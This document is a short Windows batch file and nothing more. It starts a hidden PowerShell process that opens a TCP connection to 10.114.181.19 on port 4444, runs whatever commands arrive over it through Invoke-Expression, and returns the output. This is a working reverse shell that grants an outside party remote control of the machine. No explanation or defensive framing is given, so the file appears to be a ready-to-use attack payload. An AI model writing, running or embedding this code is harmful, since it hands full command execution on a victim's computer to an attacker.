@echo off
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('10.114.181.19',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r+'PS> '),0,([text.encoding]::ASCII).GetBytes($r+'PS> ').Length);$s.Flush()}"
